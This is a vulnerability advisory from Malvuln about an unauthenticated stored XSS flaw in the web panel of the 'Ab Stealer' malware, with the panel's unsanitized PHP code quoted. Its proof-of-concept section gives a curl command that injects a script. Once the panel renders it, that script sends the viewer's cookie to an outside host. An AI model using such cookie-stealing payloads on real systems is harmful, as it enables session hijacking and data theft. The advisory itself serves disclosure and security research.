


Type: Unauthenticated Remote Persistent XSS

Author:  [Malvuln](https://twitter.com/malvuln)

```
iscovery / credits: Malvuln - malvuln.com (c) 2022
Original source: https://malvuln.com/advisory/9e44c10307aa8194753896ecf8102167.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
 
Threat: Ab Stealer Web Panel 
Vulnerability: Unauthenticated Remote Persistent XSS
Description: The "Ab Stealer" web Panel By KingDomSc for "AbBuild v.1.0.exe" is used to browse victim information "Get All Victims Passwords, With One Click". Third-party attackers who can reach the "Ab Stealer" server can write plaintext files to Panel\psw, injecting persistent Cross Site Scripting payloads without the need for authentication. The XSS payloads will execute whenever an "Ab Stealer" admin visits the Web UI or clicks an infected link to view victim information. The sending of HTTP POST requests to POST.php write files "ip-1.txt, ip-2.txt" etc to the "psw" dir. These textfiles typically contain victim information IP, Computername, Country, Date. However, since the PHP code has no security we can inject malicious client side Javascript instead. This can result in data theft and disclosure of the PHPSESSID token or GEO location disclosure for a logged on user of the "Ab Stealer" Web Panel etc.
 
Ab Stealers POST.php file doesn't sanitize input for HTTP GET requests, when writing user supplied data to files to it's "psw" web directory.
 
E.g.
 
if (isset($_GET['online'])) {
    $path    = 'psw';
    $files = array_diff(scandir($path), array('.', '..'));
    $CountFiles = count($files) + 1;
    $FileName = 'ip-'.$CountFiles.'.txt';
    $ip = $_POST['ip'];
    $computername = $_POST['computername'];
    $installdate = $_POST['installdate'];
    $country = $_POST['country'];
    $FFD = '{"ip":"'.$ip.'","computername":"'.$computername.'","country":"'.$country.'","date":"'.$installdate.'"}';
    $myfile = fopen('psw/'.$FileName, "w") or die("Unable to open file!");
    fwrite($myfile, $FFD);
    fclose($myfile);
    echo $CountFiles;
}
 
Moreover, Panel.php doesn't use htmlspecialchars OR htmlentities, to properly escape output when echoing untrusted user supplied data.
 
Type: WebUI
MD5: 9e44c10307aa8194753896ecf8102167 (AbBuild v.1.0.exe)
MD5: 017925cad9c4eb2c102053cbba04129e (index.php)
Vuln ID: MVID-2022-0450
Disclosure: 01/15/2022
 
 
Exploit/PoC:
1) Create the psw directory as the Panel setup doesn't create it when installing
 
2) curl.exe http://AB_STEALER_SERVER/Panel/POST.php?online=1 --data "ip=x.x.x.x&computername='%3Cscript%3Ewindow.open('http://malvuln.com/stealsess.php?tok='%2bdocument.cookie)%3C/script%3E&installdate=&country=HELL"
 
3) Visit Ab Stealer Web UI and or click an infected link.
 
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).
 
```

